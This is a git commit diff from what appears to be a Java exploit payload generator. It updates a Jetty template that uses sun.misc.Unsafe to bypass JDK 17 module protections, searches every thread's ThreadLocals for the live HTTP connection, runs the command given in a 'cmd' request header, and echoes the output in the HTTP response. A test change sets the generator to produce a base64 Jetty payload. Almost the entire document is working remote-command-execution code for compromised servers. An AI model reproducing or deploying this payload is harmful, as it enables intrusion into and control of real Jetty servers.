2c15b80f60b6f280dd61b2eac946b1ff36bd2bc5
demo <demo@test.com>
2024-10-01 13:05:42 +0800

    update jettyecho and jdk17

--- jeg-core/src/main/java/jeg/core/template/jetty/JettyCmdExecTpl.java
+++ jeg-core/src/main/java/jeg/core/template/jetty/JettyCmdExecTpl.java
@@ -1,9 +1,13 @@
 package jeg.core.template.jetty;
 
+import sun.misc.Unsafe;
+
 import java.io.InputStream;
+import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.util.Scanner;
 
 public class JettyCmdExecTpl {
@@ -13,67 +17,118 @@ public class JettyCmdExecTpl {
         } catch (Exception e) {
         }
     }
+    private void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = this.getClass();
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Throwable e) {
+
+        }
+    }
 
     private String getReqHeaderName() {
         return "cmd";
     }
 
 
-    public JettyCmdExecTpl() {
+    public JettyCmdExecTpl() throws NoSuchFieldException, IllegalAccessException {
+        addModule();
         run();
     }
 
 
-    private void run() {
-        try {
-            Thread thread = Thread.currentThread();
-            Field field = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
-            field.setAccessible(true);
-            Object threadLocals = field.get(thread);
-            Class<?> threadLocalMap = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
-            Field tableField = threadLocalMap.getDeclaredField("table");
-            tableField.setAccessible(true);
-            Object table = tableField.get(threadLocals);
-
-            Class<?> entry = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
-            Field valueField = entry.getDeclaredField("value");
-            valueField.setAccessible(true);
-            Object httpConnection = null;
-
-            Object obj;
-            for (int i = 0; i < Array.getLength(table); ++i) {
-                obj = Array.get(table, i);
-                if (obj != null) {
-                    httpConnection = valueField.get(obj);
-                    if (httpConnection != null && (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection") || httpConnection.getClass().getName().contains("HttpConnection"))) {
-                        break;
+    private void run() throws NoSuchFieldException, IllegalAccessException {
+        ThreadGroup group = Thread.currentThread().getThreadGroup();
+        Field f = group.getClass().getDeclaredField("threads");
+        f.setAccessible(true);
+        Thread[] threads = (Thread[]) f.get(group);
+        thread : for (Thread thread: threads) {
+            try{
+                Field threadLocalsField = thread.getClass().getDeclaredField("threadLocals");
+                threadLocalsField.setAccessible(true);
+                Object threadLocals = threadLocalsField.get(thread);
+                if (threadLocals == null){
+                    continue;
+                }
+                Field tableField = threadLocals.getClass().getDeclaredField("table");
+                tableField.setAccessible(true);
+                Object tableValue = tableField.get(threadLocals);
+                if (tableValue == null){
+                    continue;
+                }
+                Object[] tables =  (Object[])tableValue;
+                for (Object table:tables) {
+                    if (table == null){
+                        continue;
+                    }
+                    Field valueField = table.getClass().getDeclaredField("value");
+                    valueField.setAccessible(true);
+                    Object value = valueField.get(table);
+                    if (value == null){
+                        continue;
+                    }
+                    System.out.println(value.getClass().getName());
+                    if(value.getClass().getName().endsWith("AsyncHttpConnection")){
+                        Method method = value.getClass().getMethod("getRequest", null);
+                        value = method.invoke(value, null);
+                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
+                        String cmd = (String)method.invoke(value, new Object[]{getReqHeaderName()});
+                        String result = "\n"+exec(cmd);
+                        method = value.getClass().getMethod("getPrintWriter", new Class[]{String.class});
+                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, new Object[]{"utf-8"});
+                        printWriter.println(result);
+                        printWriter.flush();
+                        break thread;
+                    }else if(value.getClass().getName().endsWith("HttpConnection")){
+                        Method method = value.getClass().getDeclaredMethod("getHttpChannel", null);
+                        Object httpChannel = method.invoke(value, null);
+                        method = httpChannel.getClass().getMethod("getRequest", null);
+                        value = method.invoke(httpChannel, null);
+                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
+                        String cmd = (String)method.invoke(value, new Object[]{getReqHeaderName()});
+                        String result = "\n"+exec(cmd);
+                        method = httpChannel.getClass().getMethod("getResponse", null);
+                        value = method.invoke(httpChannel, null);
+                        method = value.getClass().getMethod("getWriter", null);
+                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, null);
+                        printWriter.println(result);
+                        printWriter.flush();
+                        break thread;
+                    }else if (value.getClass().getName().endsWith("Channel")){
+                        Field underlyingOutputField = value.getClass().getDeclaredField("underlyingOutput");
+                        underlyingOutputField.setAccessible(true);
+                        Object underlyingOutput = underlyingOutputField.get(value);
+                        Object httpConnection;
+                        try{
+                            Field _channelField = underlyingOutput.getClass().getDeclaredField("_channel");
+                            _channelField.setAccessible(true);
+                            httpConnection = _channelField.get(underlyingOutput);
+                        }catch (Exception e){
+                            Field connectionField = underlyingOutput.getClass().getDeclaredField("this$0");
+                            connectionField.setAccessible(true);
+                            httpConnection = connectionField.get(underlyingOutput);
+                        }
+                        Object request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
+                        Object response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
+                        String cmd = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, getReqHeaderName());
+                        OutputStream outputStream = (OutputStream)response.getClass().getMethod("getOutputStream").invoke(response);
+                        String result = "\n"+exec(cmd);
+                        outputStream.write(result.getBytes());
+                        outputStream.flush();
+                        break thread;
                     }
                 }
-            }
-            if (httpConnection == null) {
-                throw new RuntimeException("HttpConnection not found");
-            }
-            Object response;
-            Object request;
-            try {
-                Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
-                response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
-                request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
-            } catch (Exception e) {
-                // 兼容 Jetty(7.6.16.v20140903)
-                response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
-                request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
-            }
-            String cmd = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{getReqHeaderName()});
-            if (cmd != null) {
-                PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
-                writer.write(exec(cmd));
-                writer.flush();
-                writer.close();
-            }
-
-        } catch (Exception e) {
-            e.printStackTrace();
+            } catch (Exception e){}
         }
     }
 
--- jeg-core/src/test/java/GeneratorTest.java
+++ jeg-core/src/test/java/GeneratorTest.java
@@ -8,11 +8,11 @@ public class GeneratorTest {
         // 基本配置
         jEGConfig config = new jEGConfig() {{
             // 设置待回显的中间件为 tomcat
-            setServerType(jEGConstants.SERVER_TOMCAT);
+            setServerType(jEGConstants.SERVER_JETTY);
             // 设置待执行的 payload 为命令执行回显
             setModelType(jEGConstants.MODEL_CMD);
             // 设置 payload 的输出格式为 BASE64
-            setFormatType(jEGConstants.FORMAT_CLASS);
+            setFormatType(jEGConstants.FORMAT_BASE64);
             // 初始化基础配置
             build();
         }};
@@ -20,8 +20,9 @@ public class GeneratorTest {
         // 生成 payload
         jEGenerator generator = new jEGenerator(config);
         System.out.println("请求头: " + config.getReqHeaderName());
+        System.out.println("类名: " + config.getClassName());
         String payload = generator.getPayload();
-        System.out.println(payload.length());
+        System.out.println("长度: " + payload.length());
         System.out.println(payload);
 
     }
